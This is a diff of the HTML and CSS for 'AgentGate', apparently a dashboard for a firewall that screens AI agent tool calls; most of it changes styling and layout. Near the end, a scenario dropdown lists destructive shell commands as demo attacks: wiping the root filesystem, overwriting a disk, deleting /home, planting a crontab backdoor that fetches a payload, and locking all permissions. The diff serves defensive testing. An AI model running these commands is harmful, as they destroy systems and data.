@@ -3,46 +3,32 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>AgentGate — Live Security Firewall Cockpit &amp; Telemetry</title>
+<title>AgentGate — Security Firewall &amp; Telemetry Dashboard</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
     --bg-base: #030805;
-    --panel-bg: rgba(13, 21, 38, 0.88);
-    --panel-border: rgba(255, 255, 255, 0.08);
-    --panel-border-hover: rgba(56, 189, 248, 0.45);
-    --panel-sub: rgba(9, 15, 28, 0.95);
+    --card-bg: rgba(13, 20, 36, 0.85);
+    --card-border: rgba(255, 255, 255, 0.07);
+    --card-border-hover: rgba(56, 189, 248, 0.35);
+    --inner-bg: rgba(7, 12, 22, 0.9);
     
     --text-main: #ffffff;
     --text-muted: #94a3b8;
     --text-dim: #64748b;
     
     --primary: #38bdf8;
-    --primary-bright: #67e8f9;
-    --primary-glow: rgba(56, 189, 248, 0.3);
-    --primary-gradient: linear-gradient(135deg, #38bdf8 0%, #818cf8 100%);
-    
+    --primary-glow: rgba(56, 189, 248, 0.25);
     --green: #10b981;
     --green-bright: #34d399;
-    --green-glow: rgba(16, 185, 129, 0.3);
-    --green-gradient: linear-gradient(135deg, #10b981 0%, #34d399 100%);
-    
     --red: #f43f5e;
     --red-bright: #fb7185;
-    --red-glow: rgba(244, 63, 94, 0.3);
-    --red-gradient: linear-gradient(135deg, #f43f5e 0%, #fb7185 100%);
-    
     --amber: #f59e0b;
     --amber-bright: #fbbf24;
-    --amber-glow: rgba(245, 158, 11, 0.3);
-    --amber-gradient: linear-gradient(135deg, #f59e0b 0%, #fbbf24 100%);
-    
     --purple: #a855f7;
     --purple-bright: #c084fc;
-    --purple-glow: rgba(168, 85, 247, 0.3);
-    --purple-gradient: linear-gradient(135deg, #a855f7 0%, #c084fc 100%);
 
     --font-head: 'Outfit', sans-serif;
     --font-body: 'Plus Jakarta Sans', sans-serif;
@@ -54,9 +40,9 @@
   body {
     background-color: var(--bg-base);
     background-image: 
-      radial-gradient(circle at 12% 12%, rgba(16, 185, 129, 0.14) 0%, transparent 45%),
-      radial-gradient(circle at 88% 18%, rgba(56, 189, 248, 0.12) 0%, transparent 45%),
-      radial-gradient(circle at 50% 85%, rgba(168, 85, 247, 0.08) 0%, transparent 50%),
+      radial-gradient(circle at 10% 10%, rgba(16, 185, 129, 0.12) 0%, transparent 40%),
+      radial-gradient(circle at 90% 15%, rgba(56, 189, 248, 0.1) 0%, transparent 40%),
+      radial-gradient(circle at 50% 90%, rgba(168, 85, 247, 0.06) 0%, transparent 50%),
       linear-gradient(180deg, #030805 0%, #020403 100%);
     background-attachment: fixed;
     color: var(--text-main);
@@ -64,31 +50,28 @@
     font-size: 13px;
     line-height: 1.45;
     height: 100vh;
-    min-height: 600px;
     width: 100vw;
-    padding: 12px 18px;
+    padding: 14px 20px;
     overflow: hidden;
-    user-select: none;
   }
 
-  .app-container {
-    max-width: 1720px;
+  .app-layout {
+    max-width: 1640px;
     height: 100%;
     margin: 0 auto;
     display: flex;
     flex-direction: column;
-    gap: 10px;
-    min-height: 0;
+    gap: 12px;
   }
 
-  /* Top Navigation Header */
+  /* 1. Sleek Top Navigation Header */
   header {
-    background: var(--panel-bg);
+    background: var(--card-bg);
     backdrop-filter: blur(20px) saturate(190%);
     -webkit-backdrop-filter: blur(20px);
-    border: 1px solid var(--panel-border);
+    border: 1px solid var(--card-border);
     border-radius: 12px;
-    padding: 8px 16px;
+    padding: 10px 18px;
     display: flex;
     align-items: center;
     justify-content: space-between;
@@ -103,11 +86,11 @@
   }
 
   .logo-shield {
-    width: 28px;
-    height: 28px;
+    width: 26px;
+    height: 26px;
     border-radius: 7px;
     background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(56, 189, 248, 0.3));
-    border: 1px solid rgba(56, 189, 248, 0.5);
+    border: 1px solid rgba(56, 189, 248, 0.4);
     display: flex;
     align-items: center;
     justify-content: center;
@@ -129,38 +112,25 @@
     font-size: 10px;
     font-weight: 700;
     text-transform: uppercase;
-    padding: 2px 8px;
+    padding: 2px 7px;
     border-radius: 999px;
-    background: rgba(56, 189, 248, 0.15);
+    background: rgba(56, 189, 248, 0.12);
     color: #38bdf8;
-    border: 1px solid rgba(56, 189, 248, 0.35);
+    border: 1px solid rgba(56, 189, 248, 0.3);
   }
 
-  .nav-controls {
+  .nav-right {
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 12px;
   }
 
-  .preset-btn {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    color: var(--text-muted);
-    font-size: 11px;
-    font-weight: 600;
-    padding: 4px 8px;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: all 0.15s ease;
-  }
-  .preset-btn:hover { color: #fff; border-color: var(--primary); }
-
-  .backend-badge {
+  .backend-pill {
     font-family: var(--font-mono);
     font-size: 11px;
     color: #38bdf8;
-    background: rgba(56, 189, 248, 0.1);
-    border: 1px solid rgba(56, 189, 248, 0.28);
+    background: rgba(56, 189, 248, 0.08);
+    border: 1px solid rgba(56, 189, 248, 0.22);
     padding: 4px 10px;
     border-radius: 6px;
     display: flex;
@@ -168,12 +138,12 @@
     gap: 6px;
   }
 
-  .live-status {
+  .live-dot-wrap {
     display: flex;
     align-items: center;
     gap: 6px;
-    background: rgba(16, 185, 129, 0.15);
-    border: 1px solid rgba(16, 185, 129, 0.35);
+    background: rgba(16, 185, 129, 0.12);
+    border: 1px solid rgba(16, 185, 129, 0.3);
     padding: 4px 10px;
     border-radius: 999px;
     color: #34d399;
@@ -188,7 +158,6 @@
     background: #34d399;
     position: relative;
   }
-
   .radar-dot::after {
     content: '';
     position: absolute;
@@ -197,7 +166,6 @@
     border: 1.5px solid #34d399;
     animation: radar-ripple 1.8s infinite cubic-bezier(0, 0.2, 0.8, 1);
   }
-
   @keyframes radar-ripple {
     0% { transform: scale(0.5); opacity: 1; }
     100% { transform: scale(2.2); opacity: 0; }
@@ -214,129 +182,94 @@
   }
   .home-link:hover { color: #fff; background: rgba(255,255,255,0.06); }
 
-  /* Interactive Master Resizable Flexbox & Grid */
-  .resizable-workspace {
-    display: flex;
-    flex-direction: row;
-    flex: 1;
-    min-height: 0;
-    width: 100%;
-    gap: 0;
-    position: relative;
-  }
-
-  /* Left Column: Command & Decision Center */
-  .col-left {
-    display: flex;
-    flex-direction: column;
-    min-height: 0;
-    min-width: 320px;
-    width: 58%;
+  /* 2. Sleek Top KPI Strip (4 Minimalist Cards) */
+  .kpi-strip {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 12px;
     flex-shrink: 0;
   }
 
-  /* Vertical Column Splitter (Draggable) */
-  .gutter-col {
-    width: 10px;
-    cursor: col-resize;
-    position: relative;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    transition: background 0.2s ease;
-  }
-  .gutter-col::after {
-    content: '';
-    width: 3px;
-    height: 36px;
-    border-radius: 999px;
-    background: rgba(255, 255, 255, 0.2);
-    transition: all 0.2s ease;
-  }
-  .gutter-col:hover::after, .gutter-col.dragging::after {
-    background: var(--primary);
-    box-shadow: 0 0 10px var(--primary-bright);
-    height: 60px;
-    width: 4px;
-  }
-
-  /* Right Column: Metrics & Telemetry Stream */
-  .col-right {
-    display: flex;
-    flex-direction: column;
-    min-height: 0;
-    min-width: 320px;
-    flex: 1;
-  }
-
-  /* Horizontal Row Splitters (Draggable) */
-  .gutter-row {
-    height: 10px;
-    cursor: row-resize;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-    position: relative;
-  }
-  .gutter-row::after {
-    content: '';
-    height: 3px;
-    width: 36px;
-    border-radius: 999px;
-    background: rgba(255, 255, 255, 0.2);
-    transition: all 0.2s ease;
-  }
-  .gutter-row:hover::after, .gutter-row.dragging::after {
-    background: var(--primary);
-    box-shadow: 0 0 10px var(--primary-bright);
-    width: 60px;
-    height: 4px;
-  }
-
-  /* Shared Card Styling */
-  .card-panel {
-    background: var(--panel-bg);
-    backdrop-filter: blur(20px) saturate(190%);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid var(--panel-border);
+  .kpi-box {
+    background: var(--card-bg);
+    border: 1px solid var(--card-border);
     border-radius: 12px;
-    padding: 12px 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    min-height: 0;
-    min-width: 0;
-    position: relative;
-    user-select: text;
-  }
-
-  /* Left Top: Control & 2D Pipeline Flow Card */
-  .control-card {
-    height: 40%;
-    min-height: 140px;
-  }
-
-  .card-title-row {
+    padding: 10px 16px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 8px;
-    flex-shrink: 0;
+    position: relative;
+    overflow: hidden;
   }
 
-  .card-title {
-    font-family: var(--font-head);
-    font-size: 13.5px;
-    font-weight: 700;
-    color: #fff;
+  .kpi-box::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--primary);
+  }
+  .kpi-box.blocked::before { background: var(--red); }
+  .kpi-box.allowed::before { background: var(--green); }
+  .kpi-box.redacted::before { background: var(--purple); }
+
+  .kpi-meta {
     display: flex;
-    align-items: center;
-    gap: 6px;
+    flex-direction: column;
+    gap: 1px;
   }
 
-  .control-input-row {
+  .kpi-label {
+    font-size: 10.5px;
+    font-weight: 700;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    letter-spacing: 0.03em;
+  }
+
+  .kpi-number {
+    font-family: var(--font-head);
+    font-size: 22px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.15;
+  }
+
+  .kpi-box.blocked .kpi-number { color: var(--red-bright); }
+  .kpi-box.allowed .kpi-number { color: var(--green-bright); }
+  .kpi-box.redacted .kpi-number { color: var(--purple-bright); }
+
+  .kpi-icon {
+    font-size: 18px;
+    opacity: 0.8;
+  }
+
+  /* 3. Main Two-Column Clean Workspace */
+  .workspace-grid {
+    display: grid;
+    grid-template-columns: 1.25fr 0.95fr;
+    gap: 12px;
+    flex: 1;
+    min-height: 0;
+  }
+
+  /* Left Panel: Integrated Firewall Console & Decision Inspector */
+  .panel-left {
+    background: var(--card-bg);
+    backdrop-filter: blur(20px) saturate(190%);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--card-border);
+    border-radius: 14px;
+    padding: 14px 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    min-height: 0;
+    overflow: hidden;
+  }
+
+  /* Command Bar */
+  .command-bar {
     display: flex;
     align-items: center;
     gap: 8px;
@@ -345,10 +278,10 @@
 
   .script-select {
     flex: 1;
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 7px 10px;
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 8px;
+    padding: 8px 12px;
     color: #fff;
     font-family: var(--font-mono);
     font-size: 12px;
@@ -367,10 +300,10 @@
 
   .custom-cmd-input {
     flex: 1;
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 7px 10px;
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 8px;
+    padding: 8px 12px;
     color: #fff;
     font-family: var(--font-mono);
     font-size: 12px;
@@ -384,178 +317,188 @@
   }
 
   .btn-mode-toggle {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
     color: var(--text-muted);
-    font-size: 11px;
+    font-size: 11.5px;
     font-weight: 600;
-    padding: 7px 10px;
-    border-radius: 7px;
+    padding: 8px 12px;
+    border-radius: 8px;
     cursor: pointer;
     white-space: nowrap;
     transition: all 0.15s ease;
     flex-shrink: 0;
   }
-  .btn-mode-toggle:hover {
-    color: #fff;
-    border-color: var(--panel-border-hover);
-  }
+  .btn-mode-toggle:hover { color: #fff; border-color: var(--card-border-hover); }
 
-  .btn-fire {
+  .btn-run {
     background: linear-gradient(135deg, #10b981 0%, #38bdf8 100%);
     color: #041019;
     font-family: var(--font-head);
     font-weight: 800;
     font-size: 12.5px;
-    padding: 7px 16px;
-    border-radius: 7px;
+    padding: 8px 18px;
+    border-radius: 8px;
     border: none;
     cursor: pointer;
     display: flex;
     align-items: center;
     gap: 6px;
-    box-shadow: 0 0 16px rgba(16, 185, 129, 0.35);
+    box-shadow: 0 0 14px rgba(16, 185, 129, 0.3);
     white-space: nowrap;
     transition: transform 0.15s ease, box-shadow 0.15s ease;
     flex-shrink: 0;
   }
-  .btn-fire:hover { transform: translateY(-1px); box-shadow: 0 0 22px rgba(16, 185, 129, 0.5); }
-  .btn-fire:active { transform: translateY(0); }
+  .btn-run:hover { transform: translateY(-1px); box-shadow: 0 0 20px rgba(16, 185, 129, 0.45); }
+  .btn-run:active { transform: translateY(0); }
 
-  /* 2D Visual Pipeline Flow */
-  .pipeline-flow {
+  /* Streamlined 2D Pipeline Flow (Clean & Minimal) */
+  .pipeline-strip {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 4px;
-    flex: 1;
-    min-height: 0;
-    overflow-x: auto;
-    overflow-y: hidden;
-    padding: 2px 0;
+    gap: 6px;
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 10px;
+    padding: 8px 12px;
+    flex-shrink: 0;
   }
 
   .pipe-node {
     flex: 1;
-    min-width: 80px;
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 8px;
-    padding: 6px 4px;
     display: flex;
-    flex-direction: column;
     align-items: center;
-    text-align: center;
-    gap: 2px;
-    transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+    justify-content: center;
+    gap: 6px;
+    padding: 6px 8px;
+    border-radius: 6px;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid transparent;
+    font-size: 11.5px;
+    font-weight: 600;
+    transition: all 0.22s ease;
   }
 
   .pipe-node.active {
     border-color: var(--primary);
-    box-shadow: 0 0 14px rgba(56, 189, 248, 0.45), inset 0 0 6px rgba(56, 189, 248, 0.2);
-    transform: translateY(-2px);
+    background: rgba(56, 189, 248, 0.12);
+    color: #38bdf8;
+    box-shadow: 0 0 12px rgba(56, 189, 248, 0.35);
   }
-
   .pipe-node.blocked {
     border-color: var(--red);
-    box-shadow: 0 0 14px rgba(244, 63, 94, 0.55), inset 0 0 6px rgba(244, 63, 94, 0.25);
-    transform: translateY(-2px);
+    background: rgba(244, 63, 94, 0.15);
+    color: #fb7185;
+    box-shadow: 0 0 12px rgba(244, 63, 94, 0.45);
   }
-
   .pipe-node.passed {
     border-color: var(--green);
-    box-shadow: 0 0 14px rgba(16, 185, 129, 0.45);
+    background: rgba(16, 185, 129, 0.12);
+    color: #34d399;
   }
-
   .pipe-node.review {
     border-color: var(--amber);
-    box-shadow: 0 0 14px rgba(245, 158, 11, 0.55);
-    transform: translateY(-2px);
+    background: rgba(245, 158, 11, 0.15);
+    color: #fbbf24;
   }
 
-  .node-icon { font-size: 14px; line-height: 1; }
-  .node-name { font-family: var(--font-head); font-size: 11px; font-weight: 700; white-space: nowrap; }
-  .node-role { font-size: 9px; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 95%; }
-
-  .flow-arrow {
+  .pipe-arrow {
     color: var(--text-dim);
     font-size: 11px;
-    transition: all 0.2s ease;
     flex-shrink: 0;
   }
-  .flow-arrow.active {
-    color: var(--primary-bright);
-    filter: drop-shadow(0 0 6px var(--primary));
-    transform: scale(1.3);
+  .pipe-arrow.active {
+    color: var(--primary);
+    transform: scale(1.2);
   }
 
-  /* Left Bottom: Live Decision Inspector Card */
-  .inspector-card {
+  /* Active Decision Breakdown Section */
+  .decision-section {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
     flex: 1;
-    min-height: 160px;
-    overflow: hidden;
+    min-height: 0;
   }
 
-  .inspector-header {
+  .decision-head {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding-bottom: 6px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
     flex-shrink: 0;
+  }
+
+  .decision-title {
+    font-weight: 700;
+    font-size: 13.5px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .tool-tag {
+    font-family: var(--font-mono);
+    color: var(--primary);
+    background: rgba(56, 189, 248, 0.1);
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-size: 12px;
   }
 
   .verdict-badge {
     font-family: var(--font-mono);
-    font-size: 11px;
+    font-size: 11.5px;
     font-weight: 800;
-    padding: 3px 10px;
-    border-radius: 5px;
+    padding: 3px 12px;
+    border-radius: 6px;
     text-transform: uppercase;
   }
-  .verdict-badge.block { background: rgba(244, 63, 94, 0.22); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.45); }
-  .verdict-badge.rate_limited { background: rgba(244, 63, 94, 0.22); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.45); }
-  .verdict-badge.allow { background: rgba(16, 185, 129, 0.22); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.45); }
-  .verdict-badge.review { background: rgba(245, 158, 11, 0.22); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.45); }
+  .verdict-badge.block { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
+  .verdict-badge.rate_limited { background: rgba(244, 63, 94, 0.2); color: #fb7185; border: 1px solid rgba(244, 63, 94, 0.4); }
+  .verdict-badge.allow { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.4); }
+  .verdict-badge.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
 
-  .breakdown-grid {
+  /* 4 Metric Badges in 1 Simple Row */
+  .stats-row {
     display: grid;
     grid-template-columns: repeat(4, 1fr);
-    gap: 6px;
+    gap: 8px;
     flex-shrink: 0;
   }
 
-  .breakdown-item {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 7px;
-    padding: 5px 8px;
+  .stat-pill {
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 8px;
+    padding: 6px 10px;
     display: flex;
     flex-direction: column;
     gap: 1px;
     min-width: 0;
   }
 
-  .item-lbl { font-size: 9px; color: var(--text-dim); font-weight: 700; text-transform: uppercase; }
-  .item-val { font-family: var(--font-mono); font-size: 11.5px; color: #e2e8f0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .stat-label { font-size: 9.5px; color: var(--text-dim); font-weight: 700; text-transform: uppercase; }
+  .stat-val { font-family: var(--font-mono); font-size: 12px; color: #e2e8f0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-  .rationale-box {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
+  /* Rationale Text */
+  .rationale-text {
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
     border-left: 3px solid var(--primary);
-    border-radius: 7px;
-    padding: 6px 10px;
+    border-radius: 8px;
+    padding: 8px 12px;
     font-size: 12px;
     color: #e2e8f0;
     flex-shrink: 0;
   }
 
-  .hitl-box {
+  .hitl-panel {
     display: none;
-    background: rgba(245, 158, 11, 0.14);
-    border: 1px solid rgba(245, 158, 11, 0.4);
-    border-radius: 7px;
-    padding: 6px 10px;
+    background: rgba(245, 158, 11, 0.12);
+    border: 1px solid rgba(245, 158, 11, 0.35);
+    border-radius: 8px;
+    padding: 8px 12px;
     align-items: center;
     justify-content: space-between;
     gap: 8px;
@@ -570,21 +513,22 @@
     cursor: pointer;
   }
 
-  .code-viewer {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 7px;
+  /* JSON Payload Viewer */
+  .code-container {
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 8px;
     overflow: hidden;
     flex: 1;
-    min-height: 60px;
+    min-height: 80px;
     display: flex;
     flex-direction: column;
   }
 
-  .code-viewer-head {
-    background: rgba(255, 255, 255, 0.03);
-    border-bottom: 1px solid var(--panel-border);
-    padding: 4px 8px;
+  .code-head {
+    background: rgba(255, 255, 255, 0.02);
+    border-bottom: 1px solid var(--card-border);
+    padding: 5px 10px;
     font-family: var(--font-mono);
     font-size: 10px;
     color: var(--text-dim);
@@ -593,87 +537,46 @@
     flex-shrink: 0;
   }
 
-  pre.code-viewer-body {
-    padding: 6px 10px;
+  pre.code-body {
+    padding: 8px 10px;
     font-family: var(--font-mono);
     font-size: 11.5px;
     color: #e2e8f0;
     overflow: auto;
     flex: 1;
     margin: 0;
-    line-height: 1.35;
+    line-height: 1.4;
   }
 
-  /* Right Top: 2x2 Key Metric Tiles (Resizable Card Container) */
-  .kpi-container {
-    height: 32%;
-    min-height: 120px;
-  }
-
-  .metrics-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 8px;
-    flex: 1;
-    min-height: 0;
-  }
-
-  .metric-card {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 9px;
-    padding: 8px 12px;
+  /* Right Panel: Live Telemetry Audit Stream */
+  .panel-right {
+    background: var(--card-bg);
+    backdrop-filter: blur(20px) saturate(190%);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--card-border);
+    border-radius: 14px;
+    padding: 14px 18px;
     display: flex;
     flex-direction: column;
-    justify-content: center;
-    position: relative;
+    gap: 10px;
+    min-height: 0;
     overflow: hidden;
   }
 
-  .metric-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 2.5px;
-    background: var(--primary-gradient);
-  }
-
-  .metric-card.ok::before { background: var(--green-gradient); }
-  .metric-card.bad::before { background: var(--red-gradient); }
-  .metric-card.purple::before { background: var(--purple-gradient); }
-  .metric-card.warn::before { background: var(--amber-gradient); }
-
-  .metric-lbl {
-    font-size: 10px;
-    font-weight: 700;
-    text-transform: uppercase;
-    color: var(--text-muted);
-    letter-spacing: 0.02em;
-  }
-
-  .metric-val {
-    font-family: var(--font-head);
-    font-size: 20px;
-    font-weight: 800;
-    color: #fff;
-    line-height: 1.15;
-    margin-top: 1px;
-  }
-
-  /* Right Bottom: Live Telemetry Audit Stream Card */
-  .telemetry-card {
-    flex: 1;
-    min-height: 160px;
-    overflow: hidden;
-  }
-
-  .telemetry-head {
+  .feed-header {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding-bottom: 6px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    padding-bottom: 8px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
     flex-shrink: 0;
+  }
+
+  .feed-title {
+    font-family: var(--font-head);
+    font-size: 14px;
+    font-weight: 700;
+    color: #fff;
   }
 
   .feed-filters {
@@ -682,42 +585,42 @@
   }
 
   .filter-btn {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 4px;
-    padding: 2px 8px;
-    font-size: 10.5px;
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 5px;
+    padding: 3px 9px;
+    font-size: 11px;
     color: var(--text-muted);
     cursor: pointer;
     transition: all 0.15s ease;
   }
   .filter-btn.active, .filter-btn:hover {
     background: rgba(56, 189, 248, 0.15);
-    border-color: rgba(56, 189, 248, 0.45);
+    border-color: rgba(56, 189, 248, 0.4);
     color: #38bdf8;
   }
 
-  .telemetry-table {
+  .feed-list {
     display: flex;
     flex-direction: column;
-    gap: 4px;
+    gap: 5px;
     overflow-y: auto;
     flex: 1;
     min-height: 0;
-    padding-right: 2px;
+    padding-right: 3px;
   }
 
   .feed-row {
-    background: var(--panel-sub);
-    border: 1px solid var(--panel-border);
-    border-radius: 6px;
-    padding: 5px 8px;
+    background: var(--inner-bg);
+    border: 1px solid var(--card-border);
+    border-radius: 7px;
+    padding: 6px 10px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 6px;
-    font-size: 11.5px;
-    animation: row-in 0.22s ease;
+    gap: 8px;
+    font-size: 12px;
+    animation: row-in 0.2s ease;
     flex-shrink: 0;
   }
 
@@ -728,17 +631,17 @@
 
   .feed-tag {
     font-family: var(--font-mono);
-    font-size: 9px;
+    font-size: 9.5px;
     font-weight: 700;
     text-transform: uppercase;
-    padding: 1.5px 5px;
-    border-radius: 3px;
+    padding: 2px 6px;
+    border-radius: 4px;
     flex-shrink: 0;
   }
-  .feed-tag.blocked { background: rgba(244, 63, 94, 0.22); color: #fb7185; }
-  .feed-tag.response { background: rgba(16, 185, 129, 0.22); color: #34d399; }
-  .feed-tag.redacted { background: rgba(168, 85, 247, 0.22); color: #c084fc; }
-  .feed-tag.review { background: rgba(245, 158, 11, 0.22); color: #fbbf24; }
+  .feed-tag.blocked { background: rgba(244, 63, 94, 0.2); color: #fb7185; }
+  .feed-tag.response { background: rgba(16, 185, 129, 0.2); color: #34d399; }
+  .feed-tag.redacted { background: rgba(168, 85, 247, 0.2); color: #c084fc; }
+  .feed-tag.review { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
 
   .feed-tool {
     font-family: var(--font-mono);
@@ -750,11 +653,11 @@
   .feed-args {
     font-family: var(--font-mono);
     color: var(--text-dim);
-    font-size: 10.5px;
+    font-size: 11px;
     white-space: nowrap;
     overflow: hidden;
     text-overflow: ellipsis;
-    max-width: 220px;
+    max-width: 260px;
   }
 
   /* Custom scrollbars */
@@ -766,30 +669,27 @@
 </head>
 <body>
 
-<div class="app-container">
+<div class="app-layout">
 
-  <!-- Top Navigation Header with Layout Controls -->
+  <!-- 1. Top Minimal Header -->
   <header>
     <div class="brand-group">
       <div class="logo-shield">
-        <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
           <path d="M12 2 4 5v6c0 5 3.4 9.6 8 11 4.6-1.4 8-6 8-11V5l-8-3Z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round"/>
           <path d="m9 12 2 2 4-4" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
       <div class="brand-title">
-        AgentGate <span class="chip-tag">Live Firewall Cockpit</span>
+        AgentGate <span class="chip-tag">Live Security Firewall</span>
       </div>
     </div>
     
-    <div class="nav-controls">
-      <button class="preset-btn" title="Set balanced layout" onclick="setLayoutPreset(55, 40, 32)">🖥️ Balanced</button>
-      <button class="preset-btn" title="Expand Inspector" onclick="setLayoutPreset(68, 35, 30)">🔍 Focus Inspector</button>
-      <button class="preset-btn" title="Expand Telemetry Stream" onclick="setLayoutPreset(42, 45, 30)">📡 Focus Telemetry</button>
-      <div class="backend-badge" title="Go In-Memory Regex & AST Engine running in microsecond latency">
-        <span>⚡</span> Go Engine Active (Real-Time)
+    <div class="nav-right">
+      <div class="backend-pill" id="bd-latency-tag">
+        <span>⚡</span> Go Engine Latency: &lt;0.5ms
       </div>
-      <div class="live-status">
+      <div class="live-dot-wrap">
         <div class="radar-dot"></div>
         <span id="conn-state">CONNECTED (SSE)</span>
       </div>
@@ -797,223 +697,172 @@
     </div>
   </header>
 
-  <!-- Interactive Master Resizable Workspace -->
-  <div class="resizable-workspace" id="workspace">
+  <!-- 2. Clean 4-KPI Metric Strip (Top Row) -->
+  <div class="kpi-strip">
+    <div class="kpi-box">
+      <div class="kpi-meta">
+        <span class="kpi-label">Total Interceptions</span>
+        <span class="kpi-number" id="cnt-total">0</span>
+      </div>
+      <div class="kpi-icon">📊</div>
+    </div>
+    <div class="kpi-box blocked">
+      <div class="kpi-meta">
+        <span class="kpi-label">Blocked Threats</span>
+        <span class="kpi-number" id="cnt-blocked">0</span>
+      </div>
+      <div class="kpi-icon">🚨</div>
+    </div>
+    <div class="kpi-box allowed">
+      <div class="kpi-meta">
+        <span class="kpi-label">Passed / Allowed</span>
+        <span class="kpi-number" id="cnt-allowed">0</span>
+      </div>
+      <div class="kpi-icon">✅</div>
+    </div>
+    <div class="kpi-box redacted">
+      <div class="kpi-meta">
+        <span class="kpi-label">Secrets Redacted</span>
+        <span class="kpi-number" id="cnt-redacted">0</span>
+      </div>
+      <div class="kpi-icon">🕶️</div>
+    </div>
+  </div>
 
-    <!-- LEFT COLUMN: Command Center & Decision Inspector -->
-    <div class="col-left" id="col-left">
+  <!-- 3. Clean 2-Column Split Workspace -->
+  <div class="workspace-grid">
 
-      <!-- Top Left: Control & 2D Pipeline Console -->
-      <div class="card-panel control-card" id="card-control">
-        <div class="card-title-row">
-          <span class="card-title">Interactive Tool Evaluation &amp; 2D Architecture Pipeline</span>
-          <span style="font-family: var(--font-mono); font-size: 11px; color: var(--primary);" id="bd-latency-tag">⚡ Engine Latency: &lt;0.5ms</span>
-        </div>
+    <!-- Left Column: Unified Firewall Console & Inspector -->
+    <div class="panel-left">
 
-        <div class="control-input-row">
-          <select class="script-select" id="script-picker" onchange="onSelectScenario()">
-            <optgroup label="🚨 Semantic Gap Attacks (Catastrophic effect without rm -rf keyword)">
-              <option value="sem-1">1. find / -delete (Wipes root filesystem via Unix find expression)</option>
-              <option value="sem-2">2. dd if=/dev/zero of=/dev/sda bs=1M (Overwrites master partition table)</option>
-              <option value="sem-3">3. python3 -c "import shutil; shutil.rmtree('/home')" (Python destructive syntax)</option>
-              <option value="sem-4">4. (crontab -l; echo '* * * * * curl payload') | crontab - (Backdoor persistence)</option>
-              <option value="sem-5">5. chmod -R 000 / (Locks out all filesystem access &amp; permissions)</option>
